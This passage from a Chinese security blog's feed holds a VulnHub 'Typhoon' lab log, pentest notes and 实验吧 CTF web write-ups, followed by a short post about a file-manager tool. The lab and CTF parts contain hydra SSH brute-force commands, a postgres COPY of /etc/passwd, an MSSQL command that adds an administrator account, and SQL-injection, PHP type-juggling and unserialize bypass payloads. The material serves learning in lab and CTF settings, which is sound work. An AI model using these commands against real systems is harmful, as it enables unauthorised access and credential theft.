alt=""></p><p>之后尝试挂载，但是我无法用get命令将文件拷贝下来emmmm，主机也没有对应的挂载目录。</p><p>队友打了21号端口，但是信息也不是很多</p><p>22号端口是ssh服务，A组的师傅爆出了密码，参考安全客上的方法，可以先枚举用户名，</p><blockquote><p>发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试</p></blockquote><p>在GitHub上找了一个ssh_enum的脚本，尝试一下还行但是没有好字典</p><p>hydra可以爆破弱口令： <code>hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150</code></p><p>第一次渗透感觉还不是很熟练，能够做到的就是这些:cry:</p><h3 id="21号端口"><a href="#21号端口" class="headerlink" title="21号端口"></a>21号端口</h3><p><code>search ftp_version</code>收集ftp服务器的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ftp/ftp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.41.166:21     - FTP Banner: &apos;220 (vsFTPd 3.0.2)\x0d\x0a&apos;</span><br><span class="line">[*] 192.168.41.166:21     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>如果这个版本的ftp有漏洞的话是不是可以getshell？</p><p>浏览器直接访问并没有什么东西<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon.png" alt=""></p><p>尝试使用<code>exploit/unix/ftp/vsftpd_234_backdoor</code>进行渗透但是没成功</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ftp0.png" alt=""></p><h3 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h3><p>尝试枚举用户名为<code>typhoon</code></p><p>成功枚举<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon0.png" alt=""></p><p>使用hydra去爆破密码<code>hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon1.png" alt=""></p><h3 id="25端口smtp服务"><a href="#25端口smtp服务" class="headerlink" title="25端口smtp服务"></a>25端口smtp服务</h3><p>获取到服务器的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smtp/smtp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.41.166:25     - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a</span><br><span class="line">[*] 192.168.41.166:25     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p><h3 id="5432端口postgresql服务"><a href="#5432端口postgresql服务" class="headerlink" title="5432端口postgresql服务"></a>5432端口postgresql服务</h3><p>补充一点postgresql操作：</p><p>列出数据库<code>\l</code>：<br>``<br>postgres=# \l<br>                                  List of databases<br>   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges<br>—————-+—————+—————+——————-+——————-+———————————-<br> postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |<br> template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +<br>           |          |          |             |             | postgres=CTc/postgres<br> template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +<br>           |          |          |             |             | postgres=CTc/postgres<br>(3 rows)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">列出table&apos;\d&apos;:</span><br></pre></td></tr></table></figure></p><p>ostgres=# \d<br>         List of relations<br> Schema | Name  | Type  |  Owner<br>————+———-+———-+—————<br> public | mrlee | table | postgres<br>(1 row)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>msf5 auxiliary(scanner/postgres/postgres_version) &gt; exploit </p><p>[<em>] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)<br>[</em>] Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接发现弱口令</span><br></pre></td></tr></table></figure></p><p>[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)<br>[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)<br>[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1<br>[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后登陆</span><br></pre></td></tr></table></figure></p><h1 id="root-kali-in-3-34-50-C-127"><a href="#root-kali-in-3-34-50-C-127" class="headerlink" title="root @ kali in ~ [3:34:50] C:127"></a>root @ kali in ~ [3:34:50] C:127</h1><p>$ psql -h 192.168.41.166 -U postgres<br>Password for user postgres:<br>psql (11.2 (Debian 11.2-2), server 9.3.4)<br>Type “help” for help.</p><p>postgres=# help<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`select pg_ls_dir(&apos;./&apos;);`列出目录</span><br></pre></td></tr></table></figure></p><p>postgres=# select pg_ls_dir(‘./‘);</p><pre><code>pg_ls_dir    </code></pre><hr><p> PG_VERSION<br> pg_notify<br> pg_multixact<br> pg_subtrans<br> pg_serial<br> pg_snapshots<br> pg_stat<br> pg_clog<br> pg_xlog<br> base<br> pg_twophase<br> pg_tblspc<br> global<br> pg_stat_tmp<br> postmaster.opts<br> postmaster.pid<br>(16 rows)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">建表并且从`/etc/passwd`中拷贝数据过来再读取,（这个姿势第一次见）</span><br></pre></td></tr></table></figure><p>postgres=# DROP TABLE if EXISTS MrLee;<br>NOTICE:  table “mrlee” does not exist, skipping<br>DROP TABLE<br>postgres=# CREATE TABLE MrLee(t TEXT);<br>CREATE TABLE<br>postgres=# COPY MrLee FROM ‘/etc/passwd’;<br>COPY 44<br>postgres=# SELECT * FROM MrLee limit 1 offset 0;</p><pre><code>            t                </code></pre><hr><p> root:x:0:0:root:/root:/bin/bash<br>(1 row)</p><p>postgres=# SELECT * FROM MrLee;</p><pre><code>                                     t                                         </code></pre><hr><p> root:x:0:0:root:/root:/bin/bash<br> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br> bin:x:2:2:bin:/bin:/usr/sbin/nologin<br> sys:x:3:3:sys:/dev:/usr/sbin/nologin</p><p>```</p><h2 id="DC1靶机"><a href="#DC1靶机" class="headerlink" title="DC1靶机"></a>DC1靶机</h2><blockquote><p>姿势： find命令提权，hydra爆破，<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">Drupal重置管理员密码</a></p></blockquote><h2 id="需要积累一些靶机渗透的经验"><a href="#需要积累一些靶机渗透的经验" class="headerlink" title="需要积累一些靶机渗透的经验"></a>需要积累一些靶机渗透的经验</h2><h3 id="msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https"><a href="#msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https" class="headerlink" title="msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https"></a>msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https</h3><p><a href="https://www.cnblogs.com/-qing-/p/10128915.html" target="_blank" rel="noopener">msf各种弱口令爆破</a></p><h3 id="同时需要熟悉find和grep命令"><a href="#同时需要熟悉find和grep命令" class="headerlink" title="同时需要熟悉find和grep命令"></a>同时需要熟悉find和grep命令</h3><p><a href="https://www.cnblogs.com/-qing-/p/10867549.html" target="_blank" rel="noopener">Linux find和grep命令</a></p><h3 id="熟悉一下各种cms的常见姿势"><a href="#熟悉一下各种cms的常见姿势" class="headerlink" title="熟悉一下各种cms的常见姿势"></a>熟悉一下各种cms的常见姿势</h3><p><a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">忘记Drupal的管理员密码的解决办法</a></p><h3 id="metasploit渗透mssql服务"><a href="#metasploit渗透mssql服务" class="headerlink" title="metasploit渗透mssql服务"></a>metasploit渗透mssql服务</h3><p>1433端口对应于mssql服务，第一步一般是弱口令：<br><code>use auxiliary/scanner/mssql/mssql_login</code> 然后设置字典路径和远程主机即可</p><p>还可以使用<code>auxiliary/scanner/mssql/mssql_ping</code>进一步收集信息</p><p>之后尝试登陆mssql服务<br><code>use auxiliary/admin/mssql/mssql_exec</code> 可以设置cmd<code>set CMD cmd.exe /c net user</code></p><p>添加管理员用户，远程登陆：<br><code>cmd.exe /c net user shenlan test /add&amp;net localgroup administrator shenlan /add</code></p><p>开启3389端口一般是提供远程桌面服务，</p><p><a href="渗透之——Metasploit渗透MSSQL">渗透之——Metasploit渗透MSSQL</a></p><h3 id="masscan扫描工具"><a href="#masscan扫描工具" class="headerlink" title="masscan扫描工具"></a>masscan扫描工具</h3><p>扫描指定网络和端口：<br><code>masscan.exe -p80 192.168.81.1/24</code></p><p>扫描指定主机所有开放的端口：</p><blockquote><p>masscan.exe -p0-65535 192.168.81.143</p></blockquote><p><code>--banners</code>可以获取服务器的banner信息 <code>--echo</code>选项将配置信息保存下来，这样可以下一次快速扫描</p><blockquote><p>masscan.exe -p80,443,3306 192.168.81.143 —banners —echo&gt;1.conf 保存配置信息<br>masscan.exe -c 1.conf  读取配置信息</p></blockquote><p><code>--rate</code>提高扫描速度<br><a href="渗透技巧：Windows平台运行Masscan和Nmap">渗透技巧：Windows平台运行Masscan和Nmap</a></p><h3 id="nmap高级使用技巧"><a href="#nmap高级使用技巧" class="headerlink" title="nmap高级使用技巧"></a>nmap高级使用技巧</h3><p>nmap常见的扫描方式：</p><p>半开放扫描: -sS 没有建立三次握手连接，速度很快<br>全连接扫描：-sT  三次握手过程，速度较慢<br>扫描UDP端口： -sU</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。&lt;/p&gt;
&lt;p&gt;今天又重新从&lt;a href=&quot;https://vulnhub.com上把靶机搞下来装到Vmware上自己实验&quot; ta
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="靶机" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="nfs" scheme="https://prontosil.club/tags/nfs/"/>
    
      <category term="nmap" scheme="https://prontosil.club/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web</title>
    <link href="https://prontosil.club/2019/08/06/%E5%AE%9E%E9%AA%8C%E5%90%A7web/"/>
    <id>https://prontosil.club/2019/08/06/实验吧web/</id>
    <published>2019-08-06T13:21:26.000Z</published>
    <updated>2019-08-08T10:41:36.606Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下实验吧的wp</p><h2 id="后台登陆"><a href="#后台登陆" class="headerlink" title="后台登陆"></a>后台登陆</h2><p>ctrl+u查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125; --&gt;</span><br></pre></td></tr></table></figure><p>一上来就问管理员密码，并且要求登陆，那么是爆破呢，还是爆破呢？</p><p>emmmmm其实这题的考点是md5的</p><p>查了一下官方文档，md5函数的第二个参数如果为true,那么就会返回原始16字符二进制格式</p><p>而且sql语句显然是可以拼接注入的，关键在于如何注入了</p><p>提供一个字符串： ffifdyop<br>md5后，276f722736c95d99e921722cf9ed621c再转成字符串:’ ‘ ‘or’ 6<trach>解析:存在  or  即代码的两边有一边为真既可以绕过，<trach>其实为垃圾代码没有任何用的。or 后面有6，非零值即为真。既可以成功绕过。</trach></trach></p><blockquote><p><a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p></blockquote><p>当然看评论也有说密码就是e58的<br><a href="https://www.jianshu.com/p/" target="_blank" rel="noopener">参考</a></p><h2 id="认真一点"><a href="#认真一点" class="headerlink" title="认真一点"></a>认真一点</h2><p>这道题是盲注的题目，不太好搞</p><h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p>这个可以通过浏览器抓包，然后发现响应头中有一个FLAG字段显然是base64加密过的，解密之后就会得到提示，让你写脚本post提交</p><p>我写的垃圾代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = urllib.urlopen(<span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span>)</span><br><span class="line"></span><br><span class="line">head = str(res.headers)</span><br><span class="line"></span><br><span class="line">FLAG = head[head.index(<span class="string">'FLAG'</span>)+<span class="number">6</span>:head.index(<span class="string">'FLAG'</span>)+<span class="number">48</span>+<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">flagBase64 = base64.decodestring(FLAG)</span><br><span class="line"></span><br><span class="line">TrueFlag = flagBase64[flagBase64.index(<span class="string">':'</span>)+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'key'</span>: TrueFlag&#125;</span><br><span class="line">res = requests.post(url=<span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure><p>师傅写的代码比我好看多了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://ctf4.shiyanbar.com/web/10.php"</span> <span class="comment"># 目标URL</span></span><br><span class="line">s = requests.Session() <span class="comment"># 获取 Session</span></span><br><span class="line">response = s.get(url) <span class="comment"># 打开链接</span></span><br><span class="line">head = response.headers <span class="comment"># 获取响应头</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>] <span class="comment"># 获取相应头中的Flag</span></span><br><span class="line"><span class="keyword">print</span> flag <span class="comment"># 打印Flag</span></span><br><span class="line">postData = &#123;<span class="string">'key'</span>: flag&#125; <span class="comment"># 构造Post请求体</span></span><br><span class="line">result = s.post(url=url, data=postData) <span class="comment"># 利用Post方式发送请求</span></span><br><span class="line"><span class="comment"># (注意要在同一个Session中 , 有的时候还需要设置Cookies , 但是此题不需要)</span></span><br><span class="line"><span class="keyword">print</span> result.text <span class="comment"># 打印响应内容</span></span><br></pre></td></tr></table></figure><h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p>这个涉及到我的知识盲区，叫做伪静态页面<br><a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9D%99%E6%80%81" target="_blank" rel="noopener">百度百科</a></p><p>payload</p><blockquote><p><a href="http://ctf5.shiyanbar.com/indirection/index.php/a/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php/a/index.php</a></p></blockquote><h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><blockquote><p>作为网络安全的人才，一定要仔细观察每一处地方</p></blockquote><p>比如这个题目的表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    PIN:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"PIN"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"showsource"</span> <span class="attr">value</span>=<span class="string">0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Enter<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>很明显看到，有一个<code>hidden</code>字段，而且是<code>showsource</code>,如果将其修改为1就能得到源码</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba6.png" alt=""></p><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">"PIN"</span>];</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">-19827747736161128312837161661727773716166727272616149001823847</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulations! The flag is $flag"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"User with provided PIN not found."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>emmmm后面就不说了</p><h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p>查看源码有隐藏字段</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --&gt;</span></span><br></pre></td></tr></table></figure><p>联想到php代码审计的小trick</p><p>md5(QNKCDZO)得到的结果是0e开头的</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba7.png" alt=""></p><p>得到提示，</p><p>访问<code>http://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer</code></p><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure></p><p>天真的我以为那三个问号就是真的问号</p><p>唉。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'user'</span>=&gt;<span class="keyword">true</span>, <span class="string">'pass'</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"></span><br><span class="line">$c = unserialize($b);</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将这个作为password输入<code>a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba8.png" alt=""></p><h2 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h2><p>这个题目有点难度</p><p>不过还是要获取信息</p><p>查看源代码发现两处关键信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"editor"</span> <span class="attr">content</span>=<span class="string">"Vim"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>告诉了你管理员的邮箱和vim。。告诉我vim干嘛？当然是swp文件了</p><p>此处访问<code>http://ctf5.shiyanbar.com/10/upload/.submit.php.swp</code>可以得到swp文件<br>(这是通过抓包知道发现表单上传的就是这个文件，多试几次，记得在文件名前加<em>.</em>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token是0e00000000即可绕过</p><p>payload如下：</p><blockquote><p><a href="http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下实验吧的wp&lt;/p&gt;
&lt;h2 id=&quot;后台登陆&quot;&gt;&lt;a href=&quot;#后台登陆&quot; class=&quot;headerlink&quot; title=&quot;后台登陆&quot;&gt;&lt;/a&gt;后台登陆&lt;/h2&gt;&lt;p&gt;ctrl+u查看源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="web" scheme="https://prontosil.club/tags/web/"/>
    
      <category term="实验吧" scheme="https://prontosil.club/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
  </entry>
  
  <entry>
    <title>windows资源管理器神器</title>
    <link href="https://prontosil.club/2019/08/05/windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%A5%9E%E5%99%A8/"/>
    <id>https://prontosil.club/2019/08/05/windows资源管理器神器/</id>
    <published>2019-08-05T12:47:40.000Z</published>
    <updated>2019-08-05T13:05:30.991Z</updated>
    
    <content type="html"><![CDATA[<p>一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm</p><p>于是去搜了一下用来增强资源管理器的工具找到了这个： <code>QTTabBar</code></p><p>可以说是体验很棒了</p><p><a href="http://qttabbar.wikidot.com/" target="_blank" rel="noopener">网址</a></p><p>比如多标签页</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/tool0.gif" alt=""></p><p>再比如文件和文件夹预览</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/tool1.gif.png" alt=""></p><p>总之很棒就是了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm&lt;/p&gt;
&lt;p&gt;于是去搜了一下用来增强资源管理器的工具找到了这个：
      
    
    </summary>
    
